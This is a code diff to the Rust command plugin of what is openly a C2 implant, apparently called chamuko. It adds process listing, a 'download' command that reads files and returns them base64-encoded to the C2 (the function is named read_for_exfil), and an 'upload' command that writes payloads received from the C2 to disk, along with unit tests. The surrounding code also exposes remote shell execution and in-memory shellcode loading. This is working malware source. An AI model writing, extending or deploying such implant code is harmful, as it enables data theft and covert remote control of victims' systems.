@@ -85,6 +85,111 @@ impl CoreCommands {
         Ok(CommandOutput::new(self.cwd.display().to_string()))
     }
 
+
+    /// Lists running processes. Uses /proc on Linux and tasklist on Windows so
+    /// the agent needs no extra crate or elevated rights.
+    fn list_processes(&self) -> Result<CommandOutput, PluginError> {
+        #[cfg(unix)]
+        {
+            let mut rows: Vec<(u32, String, String)> = Vec::new();
+            let entries = std::fs::read_dir("/proc").map_err(|e| format!("ps: {e}"))?;
+            for entry in entries.flatten() {
+                let name = entry.file_name();
+                let Some(pid) = name.to_str().and_then(|s| s.parse::<u32>().ok()) else {
+                    continue;
+                };
+                let comm = std::fs::read_to_string(entry.path().join("comm"))
+                    .map(|s| s.trim().to_string())
+                    .unwrap_or_default();
+                let cmdline = std::fs::read_to_string(entry.path().join("cmdline"))
+                    .map(|s| s.replace('\0', " ").trim().to_string())
+                    .unwrap_or_default();
+                let label = if cmdline.is_empty() { comm } else { cmdline };
+                rows.push((pid, label, String::new()));
+            }
+            rows.sort_by_key(|(pid, _, _)| *pid);
+            let mut out = String::from("PID      COMMAND\n");
+            for (pid, label, _) in rows.iter().take(400) {
+                let shown: String = label.chars().take(120).collect();
+                out.push_str(&format!("{pid:<8} {shown}\n"));
+            }
+            Ok(CommandOutput::new(out))
+        }
+
+        #[cfg(windows)]
+        {
+            let output = Command::new("tasklist")
+                .args(["/FO", "CSV", "/NH"])
+                .output()
+                .map_err(|e| format!("ps: {e}"))?;
+            Ok(CommandOutput {
+                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
+                exit_code: output.status.code().unwrap_or(-1),
+            })
+        }
+    }
+
+    /// Reads a file from disk and returns it base64-encoded for the C2 to
+    /// reassemble. Size is capped so a stray /dev/zero cannot wedge the agent.
+    fn read_for_exfil(&self, args: &[String]) -> Result<CommandOutput, PluginError> {
+        const MAX_EXFIL: u64 = 64 * 1024 * 1024;
+        let target = args
+            .first()
+            .ok_or("usage: download <path>")?;
+        let path = self.resolve(target);
+        let meta = std::fs::metadata(&path).map_err(|e| format!("download: {e}"))?;
+        if !meta.is_file() {
+            return Ok(CommandOutput {
+                stdout: format!("download: not a regular file: {}", path.display()),
+                exit_code: 1,
+            });
+        }
+        if meta.len() > MAX_EXFIL {
+            return Ok(CommandOutput {
+                stdout: format!(
+                    "download: refusing {} bytes (limit {MAX_EXFIL})",
+                    meta.len()
+                ),
+                exit_code: 1,
+            });
+        }
+        let data = std::fs::read(&path).map_err(|e| format!("download: {e}"))?;
+        let encoded = base64::engine::general_purpose::STANDARD.encode(&data);
+        Ok(CommandOutput::new(format!(
+            "{}|{}|{}",
+            path.file_name()
+                .map(|n| n.to_string_lossy().to_string())
+                .unwrap_or_else(|| "file".to_string()),
+            chamuko_protocol::sha256_hex(&data),
+            encoded
+        )))
+    }
+
+    /// Writes a base64 payload received from the C2 to disk.
+    fn write_upload(&self, args: &[String]) -> Result<CommandOutput, PluginError> {
+        let target = args
+            .first()
+            .ok_or("usage: upload <path> <base64>")?;
+        let encoded = args.get(1).ok_or("usage: upload <path> <base64>")?;
+        let data = base64::engine::general_purpose::STANDARD
+            .decode(encoded.as_bytes())
+            .map_err(|e| format!("upload: bad base64: {e}"))?;
+        let path = self.resolve(target);
+        if let Some(parent) = path.parent() {
+            if !parent.as_os_str().is_empty() {
+                std::fs::create_dir_all(parent)
+                    .map_err(|e| format!("upload: cannot create dir: {e}"))?;
+            }
+        }
+        std::fs::write(&path, &data).map_err(|e| format!("upload: {e}"))?;
+        Ok(CommandOutput::new(format!(
+            "wrote {} bytes to {} (sha256={})",
+            data.len(),
+            path.display(),
+            &chamuko_protocol::sha256_hex(&data)[..16]
+        )))
+    }
+
     fn run_shellcode(&self, args: &[String]) -> Result<CommandOutput, PluginError> {
         let payload = args
             .first()
@@ -216,12 +321,26 @@ impl Plugin for CoreCommands {
     fn supports(&self, command: &str) -> bool {
         matches!(
             command,
-            "exec" | "info" | "whoami" | "hostname" | "pwd" | "ls" | "cd" | "shellcode" | "help"
+            "exec"
+                | "info"
+                | "whoami"
+                | "hostname"
+                | "pwd"
+                | "ls"
+                | "cd"
+                | "shellcode"
+                | "ps"
+                | "download"
+                | "upload"
+                | "help"
         )
     }
 
     fn supported_commands(&self) -> Vec<&'static str> {
-        vec!["exec", "info", "whoami", "hostname", "pwd", "ls", "cd", "shellcode", "help"]
+        vec![
+            "exec", "info", "whoami", "hostname", "pwd", "ls", "cd", "shellcode", "ps", "download",
+            "upload", "help",
+        ]
     }
 
     fn execute(
@@ -271,8 +390,11 @@ impl Plugin for CoreCommands {
             }
             "cd" => self.change_dir(args),
             "shellcode" => self.run_shellcode(args),
+            "ps" => self.list_processes(),
+            "download" => self.read_for_exfil(args),
+            "upload" => self.write_upload(args),
             "help" => Ok(CommandOutput::new(
-                "commands:\n  exec <cmd> [args...]  run a shell command\n  info                 show host info\n  whoami               current user\n  hostname             host name\n  pwd                  current directory\n  ls [dir]             list directory\n  cd <dir>             change directory\n  shellcode <b64>       load and execute encrypted shellcode in memory\n  help                 show this help",
+                "commands:\n  exec <cmd> [args...]  run a shell command\n  info                 show host info\n  whoami               current user\n  hostname             host name\n  pwd                  current directory\n  ls [dir]             list directory\n  cd <dir>             change directory\n  shellcode <b64>      load and execute encrypted shellcode in memory\n  ps                   list running processes\n  download <path>      read a file and return it to the C2\n  upload <path> <b64>  write a file received from the C2\n  help                 show this help",
             )),
             _ => Err(format!("unknown command: {command}").into()),
         }
@@ -342,6 +464,93 @@ mod tests {
         let out = core.execute("exec", &["pwd".to_string()]).unwrap();
         assert_eq!(out.stdout.trim(), dir.display().to_string());
         std::fs::remove_dir_all(&dir).ok();
+    }
+
+
+    #[test]
+    fn ps_lists_at_least_the_current_process() {
+        let mut core = CoreCommands::new();
+        let out = core.execute("ps", &[]).unwrap();
+        assert_eq!(out.exit_code, 0);
+        assert!(out.stdout.contains("PID"));
+        #[cfg(unix)]
+        assert!(
+            out.stdout.contains(&std::process::id().to_string()),
+            "own pid missing from ps output"
+        );
+    }
+
+    #[test]
+    fn download_returns_name_hash_and_payload() {
+        let dir = tmpdir("download");
+        let file = dir.join("nota.txt");
+        std::fs::write(&file, b"contenido").unwrap();
+        let mut core = CoreCommands::new();
+        core.cwd = dir.clone();
+
+        let out = core.execute("download", &["nota.txt".to_string()]).unwrap();
+        assert_eq!(out.exit_code, 0);
+        let mut parts = out.stdout.splitn(3, '|');
+        assert_eq!(parts.next().unwrap(), "nota.txt");
+        assert_eq!(parts.next().unwrap(), chamuko_protocol::sha256_hex(b"contenido"));
+        let encoded = parts.next().unwrap();
+        use base64::Engine;
+        let decoded = base64::engine::general_purpose::STANDARD.decode(encoded).unwrap();
+        assert_eq!(decoded, b"contenido");
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn download_refuses_directories() {
+        let dir = tmpdir("download-dir");
+        let mut core = CoreCommands::new();
+        core.cwd = dir.clone();
+        let out = core.execute("download", &[".".to_string()]).unwrap();
+        assert_eq!(out.exit_code, 1);
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn upload_writes_the_decoded_payload() {
+        let dir = tmpdir("upload");
+        let mut core = CoreCommands::new();
+        core.cwd = dir.clone();
+
+        use base64::Engine;
+        let encoded = base64::engine::general_purpose::STANDARD.encode(b"payload-bytes");
+        let out = core
+            .execute(
+                "upload",
+                &["out.bin".to_string(), encoded],
+            )
+            .unwrap();
+        assert_eq!(out.exit_code, 0);
+        assert_eq!(std::fs::read(dir.join("out.bin")).unwrap(), b"payload-bytes");
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn upload_creates_missing_parent_directories() {
+        let dir = tmpdir("upload-nested");
+        let mut core = CoreCommands::new();
+        core.cwd = dir.clone();
+
+        use base64::Engine;
+        let encoded = base64::engine::general_purpose::STANDARD.encode(b"x");
+        core.execute("upload", &["a/b/c.bin".to_string(), encoded])
+            .unwrap();
+        assert!(dir.join("a/b/c.bin").is_file());
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn new_commands_are_advertised() {
+        let core = CoreCommands::new();
+        let advertised = core.supported_commands();
+        for expected in ["ps", "download", "upload"] {
+            assert!(advertised.contains(&expected), "missing {expected}");
+            assert!(core.supports(expected));
+        }
     }
 
     #[test]
